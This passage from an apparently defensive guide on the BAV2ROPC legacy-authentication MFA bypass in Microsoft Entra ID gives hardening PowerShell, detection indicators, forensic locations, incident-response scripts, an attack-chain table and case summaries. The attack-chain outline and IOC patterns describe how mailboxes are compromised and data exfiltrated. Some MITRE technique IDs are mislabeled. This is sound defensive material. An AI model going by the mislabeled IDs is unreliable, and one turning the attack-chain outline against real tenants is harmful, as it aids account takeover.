7. **Enable policy:** `On`
8. Click **Create**

---

**Action 5: Monitor & Alert on Legacy Protocol Usage**

**Manual Steps (Configure Alert in Sentinel):**

1. Create the Sentinel KQL queries above
2. Set alert frequency to **5 minutes**
3. Enable **email notifications** to SOC team
4. Set **alert response playbook** to:
   - Disable user account immediately
   - Reset MFA credentials
   - Trigger IR investigation

---

### Priority 2: HIGH

**Action 1: Disable SMTP AUTH Specifically (Phased Approach)**

Microsoft has announced SMTP AUTH deprecation with timeline:

- **March 1, 2026:** Microsoft will reject 1% of SMTP submissions using Basic Auth
- **April 30, 2026:** Microsoft will reject 100% of SMTP submissions using Basic Auth

To proactively disable:

```powershell
# Disable SMTP AUTH per-user
Get-Mailbox | Set-CASMailbox -SmtpClientAuthenticationDisabled $true

# Or use Authentication Policy
Set-AuthenticationPolicy -Identity "BlockBasicAuth" -AllowBasicAuthSmtp:$false
```

---

**Action 2: Implement Zero Trust Access Controls**

- Require passwordless authentication (Windows Hello, FIDO2)
- Implement certificate-based authentication for service accounts
- Use managed identities for Azure services (eliminate shared secrets)

---

### Access Control & Policy Hardening

**Conditional Access - Require Device Compliance:**

```powershell
# Require compliant device for all users
$policy = @{
    "displayName" = "Require Device Compliance"
    "conditions" = @{
        "users" = @{ "includeUsers" = @("All") }
        "applications" = @{ "includeApplications" = @("All") }
    }
    "grantControls" = @{
        "operator" = "OR"
        "builtInControls" = @("compliantDevice", "domainJoinedDevice")
    }
    "state" = "on"
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $policy
```

---

**RBAC Hardening - Remove Unnecessary Roles:**

```powershell
# Identify users with Legacy auth permissions
Get-AzRoleAssignment -RoleDefinitionName "Owner" | 
  Where-Object { $_.ObjectType -eq "User" } | 
  Select-Object DisplayName, SignInName, RoleDefinitionName

# Remove unnecessary Owner roles
Remove-AzRoleAssignment -ObjectId "UserObjectID" -RoleDefinitionName "Owner" -Scope "/subscriptions/SubscriptionID"
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Entra ID Sign-In Logs:**
- User Agent contains: `BAV2ROPC`, `Outlook-iOS`, `Outlook-Android`, `Mozilla/5.0 (compatible; MSAL`
- `ClientAppUsed`: `SMTP`, `IMAP`, `POP`, `Other clients (legacy)`
- `ResultType`: `0` (success) combined with `50126` (Invalid password) in preceding events
- `Location`: Geo-impossible or high-risk country compared to user's normal location
- `ConditionalAccessStatus`: `notApplied` (legacy auth bypasses Conditional Access)

**Exchange Online Logs:**
- `ClientInfoString` contains `Hub Transport` (SMTP relay)
- High volume of `Send` operations outside business hours
- `IsClientSubmission: true` (third-party client authentication)
- `MailboxOwnerUPN` differs from `UserId` (mailbox forwarding or delegation abuse)

**Network IOCs:**
- SMTP/IMAP/POP traffic on ports 587 (SMTP), 143 (IMAP), 110 (POP)
- Connections from residential proxies or VPN endpoints
- Rapid TCP connections to `smtp.office365.com`, `outlook.office365.com` (port 143/110)

---

### Forensic Artifacts

**Disk (On-Premises):**
- Exchange server logs: `C:\Program Files\Microsoft\Exchange Server\V15\TransportRoles\Logs\FrontEnd\SmtpReceive\`
- Authentication logs: `C:\Windows\System32\winevt\Logs\Security.evtx`

**Cloud (Entra ID/Exchange Online):**
- `SigninLogs` table in Azure Sentinel (30-day retention)
- `MailboxEvents` in Unified Audit Log (90-day retention)
- `SentOperations` in Unified Audit Log (forwarding rules, delegates)

**Memory:**
- If attacker uses scripted automation, malware may leave artifacts in process memory
- Use tools like `procdump` to capture suspect processes

---

### Response Procedures

**1. Immediate Isolation:**

```powershell
# Disable compromised user account immediately
Disable-AzureADUser -ObjectId "user@company.onmicrosoft.com"

# Revoke all sign-in sessions
Revoke-AzureADUserAllRefreshToken -ObjectId "user@company.onmicrosoft.com"

# Reset password (force re-authentication)
$SecurePassword = ConvertTo-SecureString -AsPlainText "NewP@ssw0rd!23456" -Force
Set-AzureADUserPassword -ObjectId "user@company.onmicrosoft.com" -Password $SecurePassword -EnforceChangePasswordPolicy $true
```

---

**2. Collect Evidence:**

```powershell
# Export all sign-in logs for compromised user
Connect-ExchangeOnline
Search-UnifiedAuditLog -UserIds "user@company.onmicrosoft.com" -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) -ResultSize 5000 | 
  Export-Csv -Path "C:\Evidence\audit_logs.csv"

# Export mailbox forwarding rules
Get-InboxRule -Mailbox "user@company.onmicrosoft.com" | 
  Select-Object Identity, Enabled, ForwardTo, RedirectTo | 
  Export-Csv -Path "C:\Evidence\forwarding_rules.csv"

# Export mailbox delegates
Get-MailboxPermission -Identity "user@company.onmicrosoft.com" -User "*" | 
  Where-Object { $_.AccessRights -ne "None" } | 
  Export-Csv -Path "C:\Evidence\delegates.csv"
```

---

**3. Remediate:**

```powershell
# Remove malicious forwarding rules
Get-InboxRule -Mailbox "user@company.onmicrosoft.com" | 
  Where-Object { $_.ForwardTo -like "*external*" } | 
  Remove-InboxRule

# Remove unauthorized delegates
Remove-MailboxPermission -Identity "user@company.onmicrosoft.com" -User "attacker@external.com" -AccessRights FullAccess -Confirm:$false

# Audit all global admin accounts for unauthorized changes
Get-AzureADDirectoryRoleMembers -ObjectId (Get-AzureADDirectoryRole | Where-Object { $_.DisplayName -eq "Global Administrator" }).ObjectId |
  Select-Object UserPrincipalName, CreatedDateTime | 
  Export-Csv -Path "C:\Evidence\global_admins.csv"
```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1110.003] Brute Force: Password Spraying | Attacker obtains credentials via breach database or sprays common passwords |
| **2** | **Credential Access** | **[REALWORLD-001] BAV2ROPC Attack Chain** | **Attacker authenticates via legacy SMTP/IMAP/POP, bypassing MFA** |
| **3** | **Lateral Movement** | [T1087.002] Account Discovery | Attacker reviews emails to identify privileged users and service accounts |
| **4** | **Privilege Escalation** | [T1098] Account Manipulation | Attacker modifies user attributes or creates backdoor admin accounts |
| **5** | **Persistence** | [T1040] Forwarding Rule Configuration | Attacker configures mail forwarding to external account for persistent access |
| **6** | **Impact** | [T1537] Data Staged; [T1020] Automated Data Exfiltration | Attacker exfiltrates mailbox contents and sensitive communications |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Guardz Campaign (March-April 2025)

- **Target Sector:** Multiple (healthcare, finance, government)
- **Timeline:** March 18 - April 7, 2025
- **Technique Status:** BAV2ROPC active; attack progressed through 3 phases with 138% intensity escalation
- **Impact:** 9,000+ suspicious sign-in attempts; multiple successful account compromises across distributed organizations
- **Key Indicators:** 
  - Multiple unique IPs (Eastern Europe, Asia-Pacific)
  - Coordinated timing across phases
  - Systematic testing of legacy protocols
- **Reference:** [Guardz Research - The Legacy Loophole](https://guardz.com/blog/the-legacy-loophole-how-attackers-are-exploiting-entra-id-and-what-to-do-about-it/)

---

### Example 2: Kroll Incident Response Case (2024)

- **Target:** Mid-sized professional services firm
- **Vector:** Phishing email leading to compromised global administrator account
- **BAV2ROPC Exploitation:** Attacker logged in from Nigeria using `BAV2ROPC` user agent; MFA was bypassed
- **Escalation:** Attacker dismissed additional login attempts for 5+ subordinate user accounts
- **Impact:** Multi-account compromise; unauthorized email forwarding; data exfiltration
- **Detection:** BAV2ROPC user agent string in Unified Audit Log (anomalous location + legacy protocol + high-privilege account)
- **Reference:** [Kroll - Securing Microsoft 365 Case Study](https://www.kroll.com/en/publications/cyber/securing-microsoft-365-avoiding-multi-factor-authentication-bypass-vulnerabilities)

---

### Example 3: Darktrace Multi-Account Compromise (January 2026)

- **Target:** Enterprise organization with 10,000+ users
- **Initial Vector:** Account A (global administrator) compromised via phishing
- **BAV2ROPC Usage:** Attacker authenticated using rare IP address (Nigeria) with `BAV2ROPC` user agent
- **MFA Bypass:** Despite MFA being enabled, BAV2ROPC allowed non-interactive token issuance
- **Lateral Movement:** Attacker used global admin rights to:
  - Suppress security alerts for accounts B and C
  - Configure email forwarding rules
  - Create backdoor service accounts
- **Impact:** Complete mailbox compromise for executive team; 6 months of undetected access
- **Detection Failure:** Organization was not subscribed to Proactive Threat Notifications; audit logs were not reviewed in real-time
- **Reference:** [Darktrace - Multi-Account Compromise Analysis](https://www.darktrace.com/blog/breakdown-of-a-multi-account-compromise-within-office-365)

---

## Summary

BAV2ROPC represents a **critical architectural vulnerability** in Entra ID legacy authentication support. Unlike traditional authentication attacks, BAV2ROPC is **entirely legitimate from Microsoft's perspective** – it's a compatibility layer designed to support outdated applications. However, this design choice creates an **MFA bypass mechanism** that adversaries exploit systematically.

**Key Takeaways:**
1. **Disable legacy authentication immediately** – No business justification warrants MFA bypass
2. **Monitor non-interactive sign-in logs** – Standard dashboards often ignore `NonInteractiveUserSignInLogs`
3. **Enforce Conditional Access for legacy protocols** – Block `Other clients (legacy)` category entirely
4. **Implement zero-trust access controls** – Passwordless authentication eliminates credential-based attacks
5. **Threat actors are coordinated** – The 2025 Guardz campaign shows professional-grade exploitation with distributed infrastructure

Organizations still supporting legacy authentication protocols after April 30, 2026 (SMTP AUTH deadline) will remain vulnerable to BAV2ROPC attacks indefinitely. Migration to OAuth 2.0 is not optional – it is a business and security imperative.

---